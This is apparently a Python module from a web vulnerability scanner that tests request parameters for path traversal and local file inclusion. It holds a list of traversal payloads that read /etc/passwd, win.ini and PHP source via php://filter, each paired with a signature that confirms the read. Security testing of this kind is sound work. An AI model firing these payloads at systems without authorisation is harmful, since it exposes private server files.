"""Path traversal / Local File Inclusion detection."""

from __future__ import annotations

import re

from .base import Module, Severity, Confidence
from .injection import enumerate_points


# payload -> signature that proves file read
_PAYLOADS = [
    ("../../../../../../../../etc/passwd", re.compile(r"root:.*:0:0:")),
    ("....//....//....//....//....//etc/passwd", re.compile(r"root:.*:0:0:")),
    ("..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", re.compile(r"root:.*:0:0:")),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", re.compile(r"root:.*:0:0:")),
    ("/etc/passwd", re.compile(r"root:.*:0:0:")),
    ("....\\....\\....\\....\\windows\\win.ini", re.compile(r"\[fonts\]|\[extensions\]", re.I)),
    ("..\\..\\..\\..\\..\\..\\windows\\win.ini", re.compile(r"\[fonts\]|\[extensions\]", re.I)),
    ("php://filter/convert.base64-encode/resource=index",
     re.compile(r"^[A-Za-z0-9+/=\r\n]{80,}$", re.M)),
]

# only test params whose names suggest a file/path/include (reduces noise)
_FILE_PARAM_HINT = re.compile(
    r"file|path|page|doc|document|folder|dir|download|template|include|"
    r"load|read|view|content|item|name|lang|locale|style|theme|url|src|log",
    re.I,
)


class TraversalModule(Module):
    name = "traversal"
    description = "Path traversal / local file inclusion"

    def run(self) -> None:
        points = enumerate_points(self.ctx)
        # prioritise file-ish parameters, but if aggressive, test all
        aggressive = self.config.get("aggressive", False)
        targets = [p for p in points if aggressive or _FILE_PARAM_HINT.search(p.param)]
        if not targets:
            self.log.status("traversal: no file-like parameters discovered")
            return
        self.log.status(f"traversal: testing {len(targets)} parameter(s)")
        self.parallel(self._test_point, targets, workers=10)

    def _test_point(self, point):
        for payload, sig in _PAYLOADS:
            resp = point.send(payload, mode="replace")
            if resp is None:
                continue
            if sig.search(resp.text):
                self.report(
                    title="Path traversal / Local File Inclusion",
                    severity=Severity.CRITICAL,
                    category="Path Traversal / LFI",
                    url=point.url,
                    parameter=point.param,
                    evidence=f"payload {payload!r} returned OS file content matching {sig.pattern!r}",
                    description="A traversal payload caused the application to read and return "
                    "the contents of a file outside the web root, exposing arbitrary local files.",
                    remediation="Never build filesystem paths from user input. Use allowlists of "
                    "permitted files, canonicalize+validate paths, and run with least privilege.",
                    confidence=Confidence.CONFIRMED,
                    references=["https://owasp.org/www-community/attacks/Path_Traversal"],
                )
                return None
        return None
